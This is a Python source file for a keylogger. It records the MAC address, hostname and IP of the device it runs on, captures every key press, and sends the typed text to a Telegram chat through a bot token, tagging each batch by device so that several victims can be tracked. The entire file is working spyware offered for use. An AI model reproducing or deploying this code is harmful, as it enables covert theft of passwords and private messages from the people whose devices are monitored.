import os, io, time, keyboard, uuid, socket
import asyncio
from datetime import datetime
from replace import char_replacements
from tg_output_bot import bot, TOKEN, CHAT_ID

# TG MESSAGE:

buffer_for_tg = ""

# TARGET INFO:

mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
current_date = datetime.now()

# KEYLOGGING:

modified_time = time.time()

def on_key_event(key):
    global buffer_for_tg, modified_time
    char = key.name
    if char in char_replacements: # replacing some chars for better readability
        char = char_replacements[char]
    buffer_for_tg += char
    modified_time = time.time()

# MAIN FUNCTION:

async def main(): # recursive function for keylogging and outputing
        keyboard.on_press(on_key_event)
        try:
            global buffer_for_tg, modified_time # initializing buffer here to clear it after sending a message
            if TOKEN != "" and CHAT_ID != "":
                await bot.send_message(CHAT_ID, f"device connected:\nMAC adress: {mac_address}\nHost name: {hostname}\nIP address: {ip_address}")
            while True:
                #modified_time = check_last_modified_time()
                if buffer_for_tg != "":
                    if time.time() - modified_time > 2.6: # if the target didn't type anything for 2.6 seconds - 1) start a new row in .txt file 2) send TG message with typed chars by bot then clear the buffer
                        if TOKEN != "" and CHAT_ID != "":
                            await bot.send_message(CHAT_ID, f"[{mac_address}]: {buffer_for_tg}") # MAC address before typed chars in case of multiple devices tracked
                            buffer_for_tg = "" # cleaning the buffer
                    await asyncio.sleep(0.2) # unloading CPU
        except KeyboardInterrupt: # bypassing KeyboardInterrupt error
            main()

# RUN:

asyncio.run(main())
